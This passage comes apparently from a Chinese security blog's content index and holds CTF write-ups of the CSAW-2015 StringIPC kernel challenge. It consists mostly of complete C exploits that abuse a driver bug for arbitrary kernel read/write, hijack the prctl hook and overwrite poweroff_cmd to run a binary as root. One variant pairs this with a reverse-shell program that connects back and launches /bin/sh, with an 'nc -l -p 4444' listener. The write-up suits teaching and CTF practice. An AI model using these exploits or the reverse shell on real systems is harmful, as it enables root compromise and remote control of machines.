wait);&#125;\n\n查看引用发现mce_do_trigger函数有调用call_usermodehelper并且第一个参数为全局变量\nstatic void mce_do_trigger(struct work_struct *work)&#123;\tcall_usermodehelper(mce_helper, mce_helper_argv, NULL, UMH_NO_WAIT);&#125;\n\n但是需要改的东西比较多，所以寻找更好的gadget\nstatic int run_cmd(const char *cmd)&#123;\tchar **argv;\tstatic char *envp[] = &#123;\t\t&quot;HOME=/&quot;,\t\t&quot;PATH=/sbin:/bin:/usr/sbin:/usr/bin&quot;,\t\tNULL\t&#125;;\tint ret;\targv = argv_split(GFP_KERNEL, cmd, NULL);\tif (argv) &#123;\t\tret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\t\targv_free(argv);\t&#125; else &#123;\t\tret = -ENOMEM;\t&#125;\treturn ret;&#125;static int __orderly_reboot(void)&#123;\tint ret;\tret = run_cmd(reboot_cmd);\tif (ret) &#123;\t\tpr_warn(&quot;Failed to start orderly reboot: forcing the issue\\n&quot;);\t\temergency_sync();\t\tkernel_restart(NULL);\t&#125;\treturn ret;&#125;static int __orderly_poweroff(bool force)&#123;\tint ret;\tret = run_cmd(poweroff_cmd);\tif (ret &amp;&amp; force) &#123;\t\tpr_warn(&quot;Failed to start orderly shutdown: forcing the issue\\n&quot;);\t\t/*\t\t * I guess this should try to kick off some daemon to sync and\t\t * poweroff asap.  Or not even bother syncing if we&#x27;re doing an\t\t * emergency shutdown?\t\t */\t\temergency_sync();\t\tkernel_power_off();\t&#125;\treturn ret;&#125;\n\n可以看到这里的run_cmd是会调用call_usermodehelper，我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。为了实现上述目标，我们首先需要得到内核基址，在上一篇也提到了怎么计算出vdso地址，我们有了vdso地址也可以得出内核基地址了。\n综上可得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/bin/chmod 777 /flag\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 20 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tprctl(addr, 2, addr, addr, 2);\treturn 0;&#125;\n\n以上程序的效果是修改权限，当然也是可以反弹shell的，不过需要再写一个程序并且上面的exp也需要修改一下\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tsize_t kernel_base = 0;\tsize_t selinux_disable_addr = 0x2C7BA0;\tsize_t prctl_hook = 0x124FD00;\tsize_t order_cmd = 0x123D1E0;\tsize_t poweroff_work_func_addr = 0x9C4C0;\tint root_cred[12];\tint offset;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tfd = open(&quot;/proc/simp1e&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tkernel_base = addr - 0x1020000;\tprctl_hook += kernel_base;\torder_cmd += kernel_base;\tpoweroff_work_func_addr += kernel_base;\tprintf(&quot;[+] found kernel base: %lx\\n&quot;, kernel_base);\tprintf(&quot;[+] found prctl_hook: %lx\\n&quot;, prctl_hook);\tprintf(&quot;[+] found order_cmd : %lx\\n&quot;, order_cmd);\tprintf(&quot;[+] found poweroff_work_func_addr: %lx\\n&quot;, poweroff_work_func_addr);\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tstrcpy(buf, &quot;/reverse_shell\\0&quot;);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = strlen(buf) + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\tseek_args.id = alloc_args.id;\tseek_args.index = order_cmd + 13 - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tmemset(buf, &#x27;\\0&#x27;, 0x1000);\t*(size_t *)buf = poweroff_work_func_addr;\tseek_args.id = alloc_args.id;\tseek_args.index = prctl_hook - 0x10;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = buf;\twrite_args.count = 20 + 1;\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (fork() == 0)\t&#123;\t\tprctl(addr, 2, addr, addr, 2);\t\texit(-1);\t&#125;\tsystem(&quot;nc -l -p 4444&quot;);\treturn 0;&#125;\n\n反弹shell程序：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;fcntl.h&gt;#include &lt;unistd.h&gt;char server_ip[] = &quot;127.0.0.1&quot;;uint32_t server_port = 4444;int main()&#123;    int sock = socket(AF_INET, SOCK_STREAM, 0);    struct sockaddr_in attacker_addr = &#123;0&#125;;    attacker_addr.sin_family = AF_INET;    attacker_addr.sin_port = htons(server_port);    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);    while (connect(sock, (struct sockaddr *)&amp;attacker_addr, sizeof(attacker_addr)) != 0)        ;    dup2(sock, 0);    dup2(sock, 1);    dup2(sock, 2);    system(&quot;/bin/sh&quot;);&#125;\n\n题目链接：https://github.com/196082/196082\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl\n","categories":["kernel-pwn"],"tags":["HijackPrctl"]},{"title":"kernel pwn内存任意读写提升权限[1]","url":"/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/","content":"前言分析通过内存任意读写到提升权限的三种方式\n在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过commit_creds(prepare_kernel_cred(0));以及第一篇提到的直接修改cred结构体，所以这里将入门的其余几条提权方式记录一下\n本文使用题目：https://github.com/196082/196082\n例题分析CSAW-2015-StringIPC\nqemu-system-x86_64 \\-m 512M \\-kernel ./bzImage \\-initrd  ./core.cpio \\-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \\-cpu qemu64,+smep,+smap \\-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\-nographic  -enable-kvm  \\-s\n\n首先了开启了smep和smap保护，没有开启kaslr\ncat /proc/kallsyms &gt; /tmp/kallsymsecho 1 &gt; /proc/sys/kernel/kptr_restrictecho 1 &gt; /proc/sys/kernel/dmesg_restrict\n\ninit脚本没什么好说的，这里将符号表放到了tmp内\n下面来看驱动的代码：\ncase 0x77617364u:    if ( copy_from_user(&amp;write_channel, v3, 0x10LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( !private_data-&gt;channel )    &#123;        count = alloc_new_ipc_channel(*&amp;write_channel.id, &amp;channel);// 根据write_channel.id的值申请相应大小的堆块        if ( count &gt;= 0 )        &#123;            private_data-&gt;channel = channel;            LODWORD(write_channel.buf) = channel-&gt;id;// 返回堆块相应的idx            if ( copy_to_user(v5, &amp;write_channel, 0x10LL) )            &#123;                count = -22LL;                close_ipc_channel(private_data, channel-&gt;id);            &#125;        &#125;    &#125;    goto LABEL_9;case 0x77617365u:    if ( copy_from_user(&amp;write_channel, v3, 4LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -16LL;    mutex_lock(&amp;private_data-&gt;lock);    if ( private_data-&gt;channel )        goto LABEL_9;    channel_by_id = get_channel_by_id(write_channel.id, v5);// 可以看到是根据idx获取channel    count = channel_by_id;    if ( channel_by_id &gt; 0xFFFFFFFFFFFFF000LL )        goto LABEL_9;    private_data-&gt;channel = channel_by_id;    if ( !_InterlockedSub(&amp;channel_by_id-&gt;ref.refcount.counter, 1u) )        ipc_channel_destroy(&amp;channel_by_id-&gt;ref);// 释放channel    count = 0LL;    mutex_unlock(&amp;private_data-&gt;lock);    return count;\n\ncase 0x77617366u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 1LL;    goto LABEL_24;case 0x77617367u:    if ( copy_from_user(&amp;write_channel, v3, 16LL) )        return -22LL;    v11 = &amp;private_data-&gt;lock;    mutex_lock(v11);    v13 = 0LL;LABEL_24:    count = realloc_ipc_channel(write_channel.id, write_channel.buf, v13, v12);    mutex_unlock(v11);    return count;\n\n可以看到这里会进入到realloc_ipc_channel\nunsigned __int64 __fastcall realloc_ipc_channel(ipc_state *state, __int64 id, size_t size, int grow)&#123;    int v4; // edx    int v5; // r13d    unsigned __int64 result; // rax    unsigned __int64 v7; // rbx    __int64 v8; // r12    __int64 v9; // rax    _fentry__(state, id);    v5 = v4;    result = get_channel_by_id(state, id);// 根据idx获取channel    v7 = result;    if ( result &lt;= 0xFFFFFFFFFFFFF000LL )    &#123;        if ( v5 )// 变大还是变小            v8 = *(result + 16) + id;        else            v8 = *(result + 16) - id;        v9 = krealloc(*(result + 8), v8 + 1, 37748928LL);        if ( v9 )        &#123;            *(v7 + 8) = v9;            *(v7 + 16) = v8;            if ( _InterlockedSub(v7, 1u) )            &#123;                return 0LL;            &#125;            else            &#123;                ipc_channel_destroy(v7);                return 0LL;            &#125;        &#125;        else        &#123;            return 4294967274LL;        &#125;    &#125;    return result;&#125;\n\n当krealloc返回值不为0时，可以通过验证，将返回值作为内存块起始地址\nmm\\slab_common.c:/** * krealloc - reallocate memory. The contents will remain unchanged. * @p: object to reallocate memory for. * @new_size: how many bytes of memory are required. * @flags: the type of memory to allocate. * * The contents of the object pointed to are preserved up to the * lesser of the new and old sizes.  If @p is %NULL, krealloc() * behaves exactly like kmalloc().  If @new_size is 0 and @p is not a * %NULL pointer, the object pointed to is freed. */void *krealloc(const void *p, size_t new_size, gfp_t flags)&#123;\tvoid *ret;\tif (unlikely(!new_size)) &#123;\t\tkfree(p);\t\treturn ZERO_SIZE_PTR;\t&#125;\tret = __do_krealloc(p, new_size, flags);\tif (ret &amp;&amp; p != ret)\t\tkfree(p);\treturn ret;&#125;EXPORT_SYMBOL(krealloc);include\\linux\\slab.h:#define ZERO_SIZE_PTR ((void *)16)\n\n所以我们可以构造new_size为0即可返回0x10，并且我们构造为0是让记录size的位置为-1\ncase 0x77617368u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v14 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )        goto LABEL_40;    index = v14-&gt;index;    if ( write_channel.count + index &gt; v14-&gt;buf_size        || copy_to_user(write_channel.buf, &amp;v14-&gt;data[index], LODWORD(write_channel.count)) )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x77617369u:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    mutex_lock(&amp;private_data-&gt;lock);    v16 = private_data-&gt;channel;    count = write_channel.count;    if ( !private_data-&gt;channel )    &#123;        LABEL_40:        count = -6LL;        goto LABEL_9;    &#125;    v17 = v16-&gt;index;    if ( write_channel.count + v17 &gt; v16-&gt;buf_size        || strncpy_from_user(&amp;v16-&gt;data[v17], write_channel.buf, write_channel.count) &lt; 0 )    &#123;        goto LABEL_31;    &#125;    goto LABEL_9;case 0x7761736Au:    if ( copy_from_user(&amp;write_channel, v3, 24LL) )        return -22LL;    p_lock = &amp;private_data-&gt;lock;    count = -6LL;    mutex_lock(&amp;private_data-&gt;lock);    v8 = private_data-&gt;channel;    if ( !private_data-&gt;channel )        goto LABEL_9;    if ( LODWORD(write_channel.count) )    &#123;        if ( LODWORD(write_channel.count) == 1 )        &#123;            count = v8-&gt;index;            goto LABEL_9;        &#125;        goto LABEL_31;    &#125;    count = (__int64)write_channel.buf;    if ( (char *)v8-&gt;buf_size &lt;= write_channel.buf )    &#123;        LABEL_31:        count = -22LL;        goto LABEL_9;    &#125;    v8-&gt;index = (loff_t)write_channel.buf;    LABEL_9:    mutex_unlock(p_lock);    return count;\n\n下面则是根据修改index，然后根据index读取或者写入内容。\n.text:0000000000000652 48 8B 5D C8                   mov     rbx, [rbp-38h].text:0000000000000656 48 39 58 10                   cmp     [rax+10h], rbx.text:000000000000065A 76 85                         jbe     short loc_5E1\n\n并且可以看到下面是无符号比较，所以我们刚刚写入的-1就会变成最大的值，也就造成了任意地址读写了。\n修改cred结构提升权限cred结构体应该不会很陌生，所以我们的思路就是修改cred结构体中记录进程权限的值即可\n首先，每一个线程在内核中都对应一个线程栈、一个线程结构块thread_info去调度，结构体里面同时也包含了线程的一系列信息\nstruct thread_info &#123;\tstruct task_struct\t*task;\t\t/* main task structure */\t__u32\t\t\tflags;\t\t/* low level flags */\t__u32\t\t\tstatus;\t\t/* thread synchronous flags */\t__u32\t\t\tcpu;\t\t/* current CPU */\tmm_segment_t\t\taddr_limit;\tunsigned int\t\tsig_on_uaccess_error:1;\tunsigned int\t\tuaccess_err:1;\t/* uaccess failed */&#125;;\n\nthread_info结构体存放在线程栈中最低的地址，并且包含一个重要信息task_struct\nstruct task_struct &#123;\tvolatile long state;\t/* -1 unrunnable, 0 runnable, &gt;0 stopped */\tvoid *stack;\tatomic_t usage;\tunsigned int flags;\t/* per process flags, defined below */\tunsigned int ptrace;\t... ...\t/* process credentials */\tconst struct cred __rcu *ptracer_cred; /* Tracer&#x27;s credentials at attach */\tconst struct cred __rcu *real_cred; /* objective and real subjective task\t\t\t\t\t * credentials (COW) */\tconst struct cred __rcu *cred;\t/* effective (overridable) subjective task\t\t\t\t\t * credentials (COW) */\tchar comm[TASK_COMM_LEN]; /* executable name excluding path\t\t\t\t     - access with [gs]et_task_comm (which lock\t\t\t\t       it with task_lock())\t\t\t\t     - initialized normally by setup_new_exec */\t/* file system info */\tstruct nameidata *nameidata;\t    #ifdef CONFIG_SYSVIPC    /* ipc stuff */        struct sysv_sem sysvsem;        struct sysv_shm sysvshm;    #endif    ... ... &#125;;\n\n可以看到其中存放着cred结构体，这里就不再提cred结构体了\nstruct cred *prepare_creds(void)&#123;\tstruct task_struct *task = current;\tconst struct cred *old;\tstruct cred *new;\tvalidate_process_creds();\tnew = kmem_cache_alloc(cred_jar, GFP_KERNEL);\tif (!new)\t\treturn NULL;\tkdebug(&quot;prepare_creds() alloc %p&quot;, new);\told = task-&gt;cred;\tmemcpy(new, old, sizeof(struct cred));\tatomic_set(&amp;new-&gt;usage, 1);\tset_cred_subscribers(new, 0);\tget_group_info(new-&gt;group_info);\tget_uid(new-&gt;user);\tget_user_ns(new-&gt;user_ns);#ifdef CONFIG_KEYS\tkey_get(new-&gt;session_keyring);\tkey_get(new-&gt;process_keyring);\tkey_get(new-&gt;thread_keyring);\tkey_get(new-&gt;request_key_auth);#endif#ifdef CONFIG_SECURITY\tnew-&gt;security = NULL;#endif\tif (security_prepare_creds(new, old, GFP_KERNEL) &lt; 0)\t\tgoto error;\tvalidate_creds(new);\treturn new;error:\tabort_creds(new);\treturn NULL;&#125;EXPORT_SYMBOL(prepare_creds);\n\n可以看到cred结构体是通过kmem_cache_alloc创建的\n利用方式利用内存任意读找到cred结构体，再利用内存任意写，将用于表示权限的数据位写为0，就可以完成提权\n如何找到这个结构体?在task_struct里有一个 char comm[TASK_COMM_LEN]; 字符数组，这个字符串表示线程的名字，其内容可以通过linux的prctl(PR_SET_NAME,target);来设置指定的值。那么，我们设置一个复杂的长度不超过16字节的字符串作为标记，然后，在内存里搜索这个标记，如果搜索到了，就可以确定这个位置前面就是cred指针\nlinux kernel内存映射图：\n0xffffffffffffffff  ---+-----------+-----------------------------------------------+-------------+                       |           |                                               |+++++++++++++|    8M                 |           | unused hole                                   |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffff7ff000  ---|-----------+------------| FIXADDR_TOP |--------------------|+++++++++++++|    1M                 |           |                                               |+++++++++++++|0xffffffffff600000  ---+-----------+------------| VSYSCALL_ADDR |------------------|+++++++++++++|    548K               |           | vsyscalls                                     |+++++++++++++|0xffffffffff577000  ---+-----------+------------| FIXADDR_START |------------------|+++++++++++++|    5M                 |           | hole                                          |+++++++++++++|0xffffffffff000000  ---+-----------+------------| MODULES_END |--------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    1520M              |           | module mapping space (MODULES_LEN)            |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |------------------|+++++++++++++|                       |           |                                               |+++++++++++++|    512M               |           | kernel text mapping, from phys 0              |+++++++++++++|                       |           |                                               |+++++++++++++|0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |-------------|+++++++++++++|    2G                 |           | hole                                          |+++++++++++++|0xffffffff00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    64G                |           | EFI region mapping space                      |+++++++++++++|0xffffffef00000000  ---+-----------+-----------------------------------------------|+++++++++++++|    444G               |           | hole                                          |+++++++++++++|0xffffff8000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | %esp fixup stacks                             |+++++++++++++|0xffffff0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    3T                 |           | hole                                          |+++++++++++++|0xfffffc0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    16T                |           | kasan shadow memory (16TB)                    |+++++++++++++|0xffffec0000000000  ---+-----------+-----------------------------------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffeb0000000000  ---+-----------+-----------------------------------------------| kernel space|    1T                 |           | virtual memory map for all of struct pages    |+++++++++++++|0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |------------------|+++++++++++++|    32T                |           | vmalloc/ioremap (1 &lt;&lt; 